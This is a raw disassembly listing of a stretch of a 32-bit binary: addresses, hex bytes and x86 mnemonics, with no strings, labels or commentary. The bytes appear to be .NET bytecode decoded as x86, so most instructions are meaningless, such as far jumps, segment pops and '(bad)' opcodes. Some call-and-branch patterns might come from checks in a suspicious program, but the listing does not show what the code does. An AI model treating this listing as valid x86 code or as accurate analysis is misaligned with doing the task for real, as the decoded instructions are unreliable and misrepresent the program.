  4040ce:	00 0a                	add    %cl,(%edx)
  4040d0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4040d3:	58                   	pop    %eax
  4040d4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4040d7:	04 1f                	add    $0x1f,%al
  4040d9:	0a 32                	or     (%edx),%dh
  4040db:	ea 28 8d 00 00 0a 13 	ljmp   $0x130a,$0x8d28
  4040e2:	05 16 13 06 2b       	add    $0x2b061316,%eax
  4040e7:	32 11                	xor    (%ecx),%dl
  4040e9:	05 11 06 9a 13       	add    $0x139a0611,%eax
  4040ee:	07                   	pop    %es
  4040ef:	11 07                	adc    %eax,(%edi)
  4040f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4040f2:	89 00                	mov    %eax,(%eax)
  4040f4:	00 0a                	add    %cl,(%edx)
  4040f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4040f7:	8a 00                	mov    (%eax),%al
  4040f9:	00 0a                	add    %cl,(%edx)
  4040fb:	06                   	push   %es
  4040fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4040fd:	8b 00                	mov    (%eax),%eax
  4040ff:	00 0a                	add    %cl,(%edx)
  404101:	28 27                	sub    %ah,(%edi)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404108:	11 07                	adc    %eax,(%edi)
  40410a:	6f                   	outsl  %ds:(%esi),(%dx)
  40410b:	8e 00                	mov    (%eax),%es
  40410d:	00 0a                	add    %cl,(%edx)
  40410f:	de 03                	fiadds (%ebx)
  404111:	26 de 00             	fiadds %es:(%eax)
  404114:	11 06                	adc    %eax,(%esi)
  404116:	17                   	pop    %ss
  404117:	58                   	pop    %eax
  404118:	13 06                	adc    (%esi),%eax
  40411a:	11 06                	adc    %eax,(%esi)
  40411c:	11 05 8e 69 32 c6    	adc    %eax,0xc632698e
  404122:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404128:	7e 73                	jle    0x40419d
  40412a:	8f 00                	pop    (%eax)
  40412c:	00 0a                	add    %cl,(%edx)
  40412e:	13 08                	adc    (%eax),%ecx
  404130:	11 08                	adc    %ecx,(%eax)
  404132:	73 90                	jae    0x4040c4
  404134:	00 00                	add    %al,(%eax)
  404136:	0a 13                	or     (%ebx),%dl
  404138:	09 11                	or     %edx,(%ecx)
  40413a:	09 72 ed             	or     %esi,-0x13(%edx)
  40413d:	01 00                	add    %eax,(%eax)
  40413f:	70 6f                	jo     0x4041b0
  404141:	91                   	xchg   %eax,%ecx
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 11                	or     (%ecx),%dl
  404146:	09 1b                	or     %ebx,(%ebx)
  404148:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  40414c:	01 25 16 72 07 02    	add    %esp,0x2077216
  404152:	00 70 a2             	add    %dh,-0x5e(%eax)
  404155:	25 17 06 6f 8b       	and    $0x8b6f0617,%eax
  40415a:	00 00                	add    %al,(%eax)
  40415c:	0a 28                	or     (%eax),%ch
  40415e:	92                   	xchg   %eax,%edx
  40415f:	00 00                	add    %al,(%eax)
  404161:	0a a2 25 18 72 5b    	or     0x5b721825(%edx),%ah
  404167:	02 00                	add    (%eax),%al
  404169:	70 a2                	jo     0x40410d
  40416b:	25 19 06 6f 8b       	and    $0x8b6f0619,%eax
  404170:	00 00                	add    %al,(%eax)
  404172:	0a a2 25 1a 72 6f    	or     0x6f721a25(%edx),%ah
  404178:	02 00                	add    (%eax),%al
  40417a:	70 a2                	jo     0x40411e
  40417c:	28 93 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ebx)
  404182:	94                   	xchg   %eax,%esp
  404183:	00 00                	add    %al,(%eax)
  404185:	0a 11                	or     (%ecx),%dl
  404187:	09 17                	or     %edx,(%edi)
  404189:	6f                   	outsl  %ds:(%esi),(%dx)
  40418a:	95                   	xchg   %eax,%ebp
  40418b:	00 00                	add    %al,(%eax)
  40418d:	0a 11                	or     (%ecx),%dl
  40418f:	09 17                	or     %edx,(%edi)
  404191:	6f                   	outsl  %ds:(%esi),(%dx)
  404192:	96                   	xchg   %eax,%esi
  404193:	00 00                	add    %al,(%eax)
  404195:	0a 11                	or     (%ecx),%dl
  404197:	09 6f 97             	or     %ebp,-0x69(%edi)
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 11                	or     (%ecx),%dl
  40419e:	08 6f 98             	or     %ch,-0x68(%edi)
  4041a1:	00 00                	add    %al,(%eax)
  4041a3:	0a 26                	or     (%esi),%ah
  4041a5:	2b 4c 7e 99          	sub    -0x67(%esi,%edi,2),%ecx
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	0a 72 75             	or     0x75(%edx),%dh
  4041ae:	02 00                	add    (%eax),%al
  4041b0:	70 28                	jo     0x4041da
  4041b2:	9a 00 00 0a 18 6f 9b 	lcall  $0x9b6f,$0x180a0000
  4041b9:	00 00                	add    %al,(%eax)
  4041bb:	0a 13                	or     (%ebx),%dl
  4041bd:	0a 11                	or     (%ecx),%dl
  4041bf:	0a 06                	or     (%esi),%al
  4041c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c2:	8b 00                	mov    (%eax),%eax
  4041c4:	00 0a                	add    %cl,(%edx)
  4041c6:	28 92 00 00 0a 72    	sub    %dl,0x720a0000(%edx)
  4041cc:	d3 02                	roll   %cl,(%edx)
  4041ce:	00 70 06             	add    %dh,0x6(%eax)
  4041d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d2:	8b 00                	mov    (%eax),%eax
  4041d4:	00 0a                	add    %cl,(%edx)
  4041d6:	72 d3                	jb     0x4041ab
  4041d8:	02 00                	add    (%eax),%al
  4041da:	70 28                	jo     0x404204
  4041dc:	9c                   	pushf
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	0a 6f 9d             	or     -0x63(%edi),%ch
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	0a de                	or     %dh,%bl
  4041e6:	0c 11                	or     $0x11,%al
  4041e8:	0a 2c 07             	or     (%edi,%eax,1),%ch
  4041eb:	11 0a                	adc    %ecx,(%edx)
  4041ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ee:	33 00                	xor    (%eax),%eax
  4041f0:	00 0a                	add    %cl,(%edx)
  4041f2:	dc 06                	faddl  (%esi)
  4041f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f5:	8b 00                	mov    (%eax),%eax
  4041f7:	00 0a                	add    %cl,(%edx)
  4041f9:	28 73 00             	sub    %dh,0x0(%ebx)
  4041fc:	00 0a                	add    %cl,(%edx)
  4041fe:	2c 15                	sub    $0x15,%al
  404200:	06                   	push   %es
  404201:	6f                   	outsl  %ds:(%esi),(%dx)
  404202:	8b 00                	mov    (%eax),%eax
  404204:	00 0a                	add    %cl,(%edx)
  404206:	28 9e 00 00 0a 20    	sub    %bl,0x200a0000(%esi)
  40420c:	e8 03 00 00 28       	call   0x28404214
  404211:	14 00                	adc    $0x0,%al
  404213:	00 0a                	add    %cl,(%edx)
  404215:	06                   	push   %es
  404216:	6f                   	outsl  %ds:(%esi),(%dx)
  404217:	8b 00                	mov    (%eax),%eax
  404219:	00 0a                	add    %cl,(%edx)
  40421b:	17                   	pop    %ss
  40421c:	73 77                	jae    0x404295
  40421e:	00 00                	add    %al,(%eax)
  404220:	0a 28                	or     (%eax),%ch
  404222:	88 00                	mov    %al,(%eax)
  404224:	00 0a                	add    %cl,(%edx)
  404226:	6f                   	outsl  %ds:(%esi),(%dx)
  404227:	89 00                	mov    %eax,(%eax)
  404229:	00 0a                	add    %cl,(%edx)
  40422b:	6f                   	outsl  %ds:(%esi),(%dx)
  40422c:	8a 00                	mov    (%eax),%al
  40422e:	00 0a                	add    %cl,(%edx)
  404230:	28 9f 00 00 0a 0b    	sub    %bl,0xb0a0000(%edi)
  404236:	25 07 16 07 8e       	and    $0x8e071607,%eax
  40423b:	69 6f 4c 00 00 0a 73 	imul   $0x730a0000,0x4c(%edi),%ebp
  404242:	18 00                	sbb    %al,(%eax)
  404244:	00 0a                	add    %cl,(%edx)
  404246:	20 00                	and    %al,(%eax)
  404248:	00 71 02             	add    %dh,0x2(%ecx)
  40424b:	20 00                	and    %al,(%eax)
  40424d:	40                   	inc    %eax
  40424e:	0d 03 6f 19 00       	or     $0x196f03,%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	8d 57 00             	lea    0x0(%edi),%edx
  404258:	00 01                	add    %al,(%ecx)
  40425a:	0c 73                	or     $0x73,%al
  40425c:	18 00                	sbb    %al,(%eax)
  40425e:	00 0a                	add    %cl,(%edx)
  404260:	08 6f a0             	or     %ch,-0x60(%edi)
  404263:	00 00                	add    %al,(%eax)
  404265:	0a 25 08 16 08 8e    	or     0x8e081608,%ah
  40426b:	69 6f 4c 00 00 0a 6f 	imul   $0x6f0a0000,0x4c(%edi),%ebp
  404272:	41                   	inc    %ecx
  404273:	00 00                	add    %al,(%eax)
  404275:	0a 28                	or     (%eax),%ch
  404277:	82 00 00             	addb   $0x0,(%eax)
  40427a:	06                   	push   %es
  40427b:	28 a1 00 00 0a 72    	sub    %ah,0x720a0000(%ecx)
  404281:	d7                   	xlat   %ds:(%ebx)
  404282:	02 00                	add    (%eax),%al
  404284:	70 28                	jo     0x4042ae
  404286:	51                   	push   %ecx
  404287:	00 00                	add    %al,(%eax)
  404289:	0a 0d 09 73 a2 00    	or     0xa27309,%cl
  40428f:	00 0a                	add    %cl,(%edx)
  404291:	13 0b                	adc    (%ebx),%ecx
  404293:	11 0b                	adc    %ecx,(%ebx)
  404295:	72 e1                	jb     0x404278
  404297:	02 00                	add    (%eax),%al
  404299:	70 6f                	jo     0x40430a
  40429b:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4042a0:	0b 72 f5             	or     -0xb(%edx),%esi
  4042a3:	02 00                	add    (%eax),%al
  4042a5:	70 6f                	jo     0x404316
  4042a7:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4042ac:	0b 72 15             	or     0x15(%edx),%esi
  4042af:	03 00                	add    (%eax),%eax
  4042b1:	70 06                	jo     0x4042b9
  4042b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4042b4:	8b 00                	mov    (%eax),%eax
  4042b6:	00 0a                	add    %cl,(%edx)
  4042b8:	72 d3                	jb     0x40428d
  4042ba:	02 00                	add    (%eax),%al
  4042bc:	70 28                	jo     0x4042e6
  4042be:	9c                   	pushf
  4042bf:	00 00                	add    %al,(%eax)
  4042c1:	0a 6f a3             	or     -0x5d(%edi),%ch
  4042c4:	00 00                	add    %al,(%eax)
  4042c6:	0a 11                	or     (%ecx),%dl
  4042c8:	0b 72 2b             	or     0x2b(%edx),%esi
  4042cb:	03 00                	add    (%eax),%eax
  4042cd:	70 28                	jo     0x4042f7
  4042cf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4042d0:	00 00                	add    %al,(%eax)
  4042d2:	0a 28                	or     (%eax),%ch
  4042d4:	51                   	push   %ecx
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	0a 6f a3             	or     -0x5d(%edi),%ch
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	0a 11                	or     (%ecx),%dl
  4042de:	0b 72 33             	or     0x33(%edx),%esi
  4042e1:	03 00                	add    (%eax),%eax
  4042e3:	70 09                	jo     0x4042ee
  4042e5:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  4042eb:	3f                   	aas
  4042ec:	03 00                	add    (%eax),%eax
  4042ee:	70 28                	jo     0x404318
  4042f0:	9c                   	pushf
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	0a 6f a3             	or     -0x5d(%edi),%ch
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a de                	or     %dh,%bl
  4042fa:	0c 11                	or     $0x11,%al
  4042fc:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  4042ff:	11 0b                	adc    %ecx,(%ebx)
  404301:	6f                   	outsl  %ds:(%esi),(%dx)
  404302:	33 00                	xor    (%eax),%eax
  404304:	00 0a                	add    %cl,(%edx)
  404306:	dc 73 90             	fdivl  -0x70(%ebx)
  404309:	00 00                	add    %al,(%eax)
  40430b:	0a 25 09 6f 91 00    	or     0x916f09,%ah
  404311:	00 0a                	add    %cl,(%edx)
  404313:	25 17 6f 96 00       	and    $0x966f17,%eax
  404318:	00 0a                	add    %cl,(%edx)
  40431a:	25 16 6f a6 00       	and    $0xa66f16,%eax
  40431f:	00 0a                	add    %cl,(%edx)
  404321:	25 16 6f a7 00       	and    $0xa76f16,%eax
  404326:	00 0a                	add    %cl,(%edx)
  404328:	25 17 6f 95 00       	and    $0x956f17,%eax
  40432d:	00 0a                	add    %cl,(%edx)
  40432f:	28 a8 00 00 0a 26    	sub    %ch,0x260a0000(%eax)
  404335:	16                   	push   %ss
  404336:	28 16                	sub    %dl,(%esi)
  404338:	00 00                	add    %al,(%eax)
  40433a:	0a de                	or     %dh,%bl
  40433c:	03 26                	add    (%esi),%esp
  40433e:	de 00                	fiadds (%eax)
  404340:	2a 00                	sub    (%eax),%al
  404342:	00 00                	add    %al,(%eax)
  404344:	41                   	inc    %ecx
  404345:	64 00 00             	add    %al,%fs:(%eax)
  404348:	00 00                	add    %al,(%eax)
  40434a:	00 00                	add    %al,(%eax)
  40434c:	67 00 00             	add    %al,(%bx,%si)
  40434f:	00 22                	add    %ah,(%edx)
  404351:	00 00                	add    %al,(%eax)
  404353:	00 89 00 00 00 03    	add    %cl,0x3000000(%ecx)
  404359:	00 00                	add    %al,(%eax)
  40435b:	00 0f                	add    %cl,(%edi)
  40435d:	00 00                	add    %al,(%eax)
  40435f:	01 02                	add    %eax,(%edx)
  404361:	00 00                	add    %al,(%eax)
  404363:	00 36                	add    %dh,(%esi)
  404365:	01 00                	add    %eax,(%eax)
  404367:	00 29                	add    %ch,(%ecx)
  404369:	00 00                	add    %al,(%eax)
  40436b:	00 5f 01             	add    %bl,0x1(%edi)
  40436e:	00 00                	add    %al,(%eax)
  404370:	0c 00                	or     $0x0,%al
  404372:	00 00                	add    %al,(%eax)
  404374:	00 00                	add    %al,(%eax)
  404376:	00 00                	add    %al,(%eax)
  404378:	02 00                	add    (%eax),%al
  40437a:	00 00                	add    %al,(%eax)
  40437c:	0b 02                	or     (%edx),%eax
  40437e:	00 00                	add    %al,(%eax)
  404380:	68 00 00 00 73       	push   $0x73000000
  404385:	02 00                	add    (%eax),%al
  404387:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  404396:	00 00                	add    %al,(%eax)
  404398:	b5 02                	mov    $0x2,%ch
  40439a:	00 00                	add    %al,(%eax)
  40439c:	b5 02                	mov    $0x2,%ch
  40439e:	00 00                	add    %al,(%eax)
  4043a0:	03 00                	add    (%eax),%eax
  4043a2:	00 00                	add    %al,(%eax)
  4043a4:	11 00                	adc    %eax,(%eax)
  4043a6:	00 01                	add    %al,(%ecx)
  4043a8:	1e                   	push   %ds
  4043a9:	02 28                	add    (%eax),%ch
  4043ab:	1a 00                	sbb    (%eax),%al
  4043ad:	00 0a                	add    %cl,(%edx)
  4043af:	2a aa 28 75 00 00    	sub    0x7528(%edx),%ch
  4043b5:	06                   	push   %es
  4043b6:	2d 1c 28 76 00       	sub    $0x76281c,%eax
  4043bb:	00 06                	add    %al,(%esi)
  4043bd:	2d 15 28 77 00       	sub    $0x772815,%eax
  4043c2:	00 06                	add    %al,(%esi)
  4043c4:	2d 0e 28 73 00       	sub    $0x73280e,%eax
  4043c9:	00 06                	add    %al,(%esi)
  4043cb:	2d 07 28 74 00       	sub    $0x742807,%eax
  4043d0:	00 06                	add    %al,(%esi)
  4043d2:	2c 06                	sub    $0x6,%al
  4043d4:	14 28                	adc    $0x28,%al
  4043d6:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  4043db:	00 1b                	add    %bl,(%ebx)
  4043dd:	30 02                	xor    %al,(%edx)
  4043df:	00 2e                	add    %ch,(%esi)
  4043e1:	00 00                	add    %al,(%eax)
  4043e3:	00 18                	add    %bl,(%eax)
  4043e5:	00 00                	add    %al,(%eax)
  4043e7:	11 21                	adc    %esp,(%ecx)
  4043e9:	00 22                	add    %ah,(%edx)
  4043eb:	e2 33                	loop   0x404420
  4043ed:	0e                   	push   %cs
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	00 0a                	add    %cl,(%edx)
  4043f2:	28 aa 00 00 0a 28    	sub    %ch,0x280a0000(%edx)
  4043f8:	ab                   	stos   %eax,%es:(%edi)
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	0a 73 ac             	or     -0x54(%ebx),%dh
  4043fe:	00 00                	add    %al,(%eax)
  404400:	0a 28                	or     (%eax),%ch
  404402:	ad                   	lods   %ds:(%esi),%eax
  404403:	00 00                	add    %al,(%eax)
  404405:	0a 06                	or     (%esi),%al
  404407:	30 04 17             	xor    %al,(%edi,%edx,1)
  40440a:	0b de                	or     %esi,%ebx
  40440c:	07                   	pop    %es
  40440d:	de 03                	fiadds (%ebx)
  40440f:	26 de 00             	fiadds %es:(%eax)
  404412:	16                   	push   %ss
  404413:	2a 07                	sub    (%edi),%al
  404415:	2a 00                	sub    (%eax),%al
  404417:	00 01                	add    %al,(%ecx)
  404419:	10 00                	adc    %al,(%eax)
  40441b:	00 00                	add    %al,(%eax)
  40441d:	00 00                	add    %al,(%eax)
  40441f:	00 27                	add    %ah,(%edi)
  404421:	27                   	daa
  404422:	00 03                	add    %al,(%ebx)
  404424:	0f 00 00             	sldt   (%eax)
  404427:	01 1b                	add    %ebx,(%ebx)
  404429:	30 02                	xor    %al,(%edx)
  40442b:	00 28                	add    %ch,(%eax)
  40442d:	00 00                	add    %al,(%eax)
  40442f:	00 02                	add    %al,(%edx)
  404431:	00 00                	add    %al,(%eax)
  404433:	11 73 ae             	adc    %esi,-0x52(%ebx)
  404436:	00 00                	add    %al,(%eax)
  404438:	0a 28                	or     (%eax),%ch
  40443a:	af                   	scas   %es:(%edi),%eax
  40443b:	00 00                	add    %al,(%eax)
  40443d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404440:	00 00                	add    %al,(%eax)
  404442:	0a 72 4f             	or     0x4f(%edx),%dh
  404445:	03 00                	add    (%eax),%eax
  404447:	70 6f                	jo     0x4044b8
  404449:	b0 00                	mov    $0x0,%al
  40444b:	00 0a                	add    %cl,(%edx)
  40444d:	2c 04                	sub    $0x4,%al
  40444f:	17                   	pop    %ss
  404450:	0a de                	or     %dh,%bl
  404452:	07                   	pop    %es
  404453:	de 03                	fiadds (%ebx)
  404455:	26 de 00             	fiadds %es:(%eax)
  404458:	16                   	push   %ss
  404459:	2a 06                	sub    (%esi),%al
  40445b:	2a 01                	sub    (%ecx),%al
  40445d:	10 00                	adc    %al,(%eax)
  40445f:	00 00                	add    %al,(%eax)
  404461:	00 00                	add    %al,(%eax)
  404463:	00 21                	add    %ah,(%ecx)
  404465:	21 00                	and    %eax,(%eax)
  404467:	03 0f                	add    (%edi),%ecx
  404469:	00 00                	add    %al,(%eax)
  40446b:	01 1b                	add    %ebx,(%ebx)
  40446d:	30 02                	xor    %al,(%edx)
  40446f:	00 d0                	add    %dl,%al
  404471:	00 00                	add    %al,(%eax)
  404473:	00 19                	add    %bl,(%ecx)
  404475:	00 00                	add    %al,(%eax)
  404477:	11 72 55             	adc    %esi,0x55(%edx)
  40447a:	03 00                	add    (%eax),%eax
  40447c:	70 73                	jo     0x4044f1
  40447e:	b1 00                	mov    $0x0,%cl
  404480:	00 0a                	add    %cl,(%edx)
  404482:	0a 06                	or     (%esi),%al
  404484:	6f                   	outsl  %ds:(%esi),(%dx)
  404485:	b2 00                	mov    $0x0,%dl
  404487:	00 0a                	add    %cl,(%edx)
  404489:	0b 07                	or     (%edi),%eax
  40448b:	6f                   	outsl  %ds:(%esi),(%dx)
  40448c:	b3 00                	mov    $0x0,%bl
  40448e:	00 0a                	add    %cl,(%edx)
  404490:	0c 2b                	or     $0x2b,%al
  404492:	7c 08                	jl     0x40449c
  404494:	6f                   	outsl  %ds:(%esi),(%dx)
  404495:	b4 00                	mov    $0x0,%ah
  404497:	00 0a                	add    %cl,(%edx)
  404499:	0d 09 72 9b 03       	or     $0x39b7209,%eax
  40449e:	00 70 6f             	add    %dh,0x6f(%eax)
  4044a1:	b5 00                	mov    $0x0,%ch
  4044a3:	00 0a                	add    %cl,(%edx)
  4044a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4044a6:	38 00                	cmp    %al,(%eax)
  4044a8:	00 0a                	add    %cl,(%edx)
  4044aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ab:	5b                   	pop    %ebx
  4044ac:	00 00                	add    %al,(%eax)
  4044ae:	0a 13                	or     (%ebx),%dl
  4044b0:	04 11                	add    $0x11,%al
  4044b2:	04 72                	add    $0x72,%al
  4044b4:	b5 03                	mov    $0x3,%ch
  4044b6:	00 70 28             	add    %dh,0x28(%eax)
  4044b9:	27                   	daa
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4044bf:	09 72 e1             	or     %esi,-0x1f(%edx)
  4044c2:	03 00                	add    (%eax),%eax
  4044c4:	70 6f                	jo     0x404535
  4044c6:	b5 00                	mov    $0x0,%ch
  4044c8:	00 0a                	add    %cl,(%edx)
  4044ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4044cb:	38 00                	cmp    %al,(%eax)
  4044cd:	00 0a                	add    %cl,(%edx)
  4044cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d0:	b6 00                	mov    $0x0,%dh
  4044d2:	00 0a                	add    %cl,(%edx)
  4044d4:	72 ed                	jb     0x4044c3
  4044d6:	03 00                	add    (%eax),%eax
  4044d8:	70 6f                	jo     0x404549
  4044da:	b0 00                	mov    $0x0,%al
  4044dc:	00 0a                	add    %cl,(%edx)
  4044de:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  4044e3:	fd                   	std
  4044e4:	03 00                	add    (%eax),%eax
  4044e6:	70 6f                	jo     0x404557
  4044e8:	b0 00                	mov    $0x0,%al
  4044ea:	00 0a                	add    %cl,(%edx)
  4044ec:	2d 1c 09 72 e1       	sub    $0xe172091c,%eax
  4044f1:	03 00                	add    (%eax),%eax
  4044f3:	70 6f                	jo     0x404564
  4044f5:	b5 00                	mov    $0x0,%ch
  4044f7:	00 0a                	add    %cl,(%edx)
  4044f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4044fa:	38 00                	cmp    %al,(%eax)
  4044fc:	00 0a                	add    %cl,(%edx)
  4044fe:	72 0b                	jb     0x40450b
  404500:	04 00                	add    $0x0,%al
  404502:	70 28                	jo     0x40452c
  404504:	27                   	daa
  404505:	00 00                	add    %al,(%eax)
  404507:	0a 2c 05 17 13 05 de 	or     -0x21faece9(,%eax,1),%ch
  40450e:	36 08 6f b7          	or     %ch,%ss:-0x49(%edi)
  404512:	00 00                	add    %al,(%eax)
  404514:	0a 3a                	or     (%edx),%bh
  404516:	79 ff                	jns    0x404517
  404518:	ff                   	(bad)
  404519:	ff                   	lcall  (bad)
  40451a:	de 0a                	fimuls (%edx)
  40451c:	08 2c 06             	or     %ch,(%esi,%eax,1)
  40451f:	08 6f 33             	or     %ch,0x33(%edi)
  404522:	00 00                	add    %al,(%eax)
  404524:	0a dc                	or     %ah,%bl
  404526:	de 0a                	fimuls (%edx)
  404528:	07                   	pop    %es
  404529:	2c 06                	sub    $0x6,%al
  40452b:	07                   	pop    %es
  40452c:	6f                   	outsl  %ds:(%esi),(%dx)
  40452d:	33 00                	xor    (%eax),%eax
  40452f:	00 0a                	add    %cl,(%edx)
  404531:	dc de                	(bad)
  404533:	0a 06                	or     (%esi),%al
  404535:	2c 06                	sub    $0x6,%al
  404537:	06                   	push   %es
  404538:	6f                   	outsl  %ds:(%esi),(%dx)
  404539:	33 00                	xor    (%eax),%eax
  40453b:	00 0a                	add    %cl,(%edx)
  40453d:	dc de                	(bad)
  40453f:	03 26                	add    (%esi),%esp
  404541:	de 00                	fiadds (%eax)
  404543:	16                   	push   %ss
  404544:	2a 11                	sub    (%ecx),%dl
  404546:	05 2a 01 34 00       	add    $0x34012a,%eax
  40454b:	00 02                	add    %al,(%edx)
  40454d:	00 19                	add    %bl,(%ecx)
  40454f:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404555:	00 00                	add    %al,(%eax)
  404557:	00 02                	add    %al,(%edx)
  404559:	00 12                	add    %dl,(%edx)
  40455b:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404561:	00 00                	add    %al,(%eax)
  404563:	00 02                	add    %al,(%edx)
  404565:	00 0b                	add    %cl,(%ebx)
  404567:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  40456d:	00 00                	add    %al,(%eax)
  40456f:	00 00                	add    %al,(%eax)
  404571:	00 00                	add    %al,(%eax)
  404573:	00 c8                	add    %cl,%al
  404575:	c8 00 03 0f          	enter  $0x300,$0xf
  404579:	00 00                	add    %al,(%eax)
  40457b:	01 1b                	add    %ebx,(%ebx)
  40457d:	30 02                	xor    %al,(%edx)
  40457f:	00 1f                	add    %bl,(%edi)
  404581:	00 00                	add    %al,(%eax)
  404583:	00 1a                	add    %bl,(%edx)
  404585:	00 00                	add    %al,(%eax)
  404587:	11 16                	adc    %edx,(%esi)
  404589:	0a 28                	or     (%eax),%ch
  40458b:	88 00                	mov    %al,(%eax)
  40458d:	00 0a                	add    %cl,(%edx)
  40458f:	6f                   	outsl  %ds:(%esi),(%dx)
  404590:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  404595:	00 28                	add    %ch,(%eax)
  404597:	79 00                	jns    0x404599
  404599:	00 06                	add    %al,(%esi)
  40459b:	26 06                	es push %es
  40459d:	0b de                	or     %esi,%ebx
  40459f:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4045a4:	00 07                	add    %al,(%edi)
  4045a6:	2a 00                	sub    (%eax),%al
  4045a8:	01 10                	add    %edx,(%eax)
  4045aa:	00 00                	add    %al,(%eax)
  4045ac:	00 00                	add    %al,(%eax)
  4045ae:	02 00                	add    (%eax),%al
  4045b0:	16                   	push   %ss
  4045b1:	18 00                	sbb    %al,(%eax)
  4045b3:	05 0f 00 00 01       	add    $0x100000f,%eax
  4045b8:	1b 30                	sbb    (%eax),%esi
  4045ba:	01 00                	add    %eax,(%eax)
  4045bc:	23 00                	and    (%eax),%eax
  4045be:	00 00                	add    %al,(%eax)
  4045c0:	1b 00                	sbb    (%eax),%eax
  4045c2:	00 11                	add    %dl,(%ecx)
  4045c4:	72 21                	jb     0x4045e7
  4045c6:	04 00                	add    $0x0,%al
  4045c8:	70 28                	jo     0x4045f2
  4045ca:	78 00                	js     0x4045cc
  4045cc:	00 06                	add    %al,(%esi)
  4045ce:	0a 12                	or     (%edx),%dl
  4045d0:	00 28                	add    %ch,(%eax)
  4045d2:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4045d7:	04 17                	add    $0x17,%al
  4045d9:	0b de                	or     %esi,%ebx
  4045db:	09 16                	or     %edx,(%esi)
  4045dd:	0b de                	or     %esi,%ebx
  4045df:	05 26 16 0b de       	add    $0xde0b1626,%eax
  4045e4:	00 07                	add    %al,(%edi)
  4045e6:	2a 00                	sub    (%eax),%al
  4045e8:	01 10                	add    %edx,(%eax)
  4045ea:	00 00                	add    %al,(%eax)
  4045ec:	00 00                	add    %al,(%eax)
  4045ee:	00 00                	add    %al,(%eax)
  4045f0:	1c 1c                	sbb    $0x1c,%al
  4045f2:	00 05 0f 00 00 01    	add    %al,0x100000f
  4045f8:	1e                   	push   %ds
  4045f9:	02 28                	add    (%eax),%ch
  4045fb:	1a 00                	sbb    (%eax),%al
  4045fd:	00 0a                	add    %cl,(%edx)
  4045ff:	2a 1b                	sub    (%ebx),%bl
  404601:	30 02                	xor    %al,(%edx)
  404603:	00 65 00             	add    %ah,0x0(%ebp)
  404606:	00 00                	add    %al,(%eax)
  404608:	1c 00                	sbb    $0x0,%al
  40460a:	00 11                	add    %dl,(%ecx)
  40460c:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  404612:	16                   	push   %ss
  404613:	0b 2b                	or     (%ebx),%ebp
  404615:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  40461a:	02 08                	add    (%eax),%cl
  40461c:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  404620:	06                   	push   %es
  404621:	6f                   	outsl  %ds:(%esi),(%dx)
  404622:	5b                   	pop    %ebx
  404623:	00 00                	add    %al,(%eax)
  404625:	0a 72 39             	or     0x39(%edx),%dh
  404628:	04 00                	add    $0x0,%al
  40462a:	70 6f                	jo     0x40469b
  40462c:	b0 00                	mov    $0x0,%al
  40462e:	00 0a                	add    %cl,(%edx)
  404630:	2c 18                	sub    $0x18,%al
  404632:	7e 10                	jle    0x404644
  404634:	00 00                	add    %al,(%eax)
  404636:	04 72                	add    $0x72,%al
  404638:	59                   	pop    %ecx
  404639:	04 00                	add    $0x0,%al
  40463b:	70 28                	jo     0x404665
  40463d:	8d 00                	lea    (%eax),%eax
  40463f:	00 06                	add    %al,(%esi)
  404641:	26 72 59             	es jb  0x40469d
  404644:	04 00                	add    $0x0,%al
  404646:	70 0d                	jo     0x404655
  404648:	de 25 de 03 26 de    	fisubs 0xde2603de
  40464e:	00 07                	add    %al,(%edi)
  404650:	17                   	pop    %ss
  404651:	58                   	pop    %eax
  404652:	0b 07                	or     (%edi),%eax
  404654:	06                   	push   %es
  404655:	8e 69 32             	mov    0x32(%ecx),%gs
  404658:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  40465d:	04 72                	add    $0x72,%al
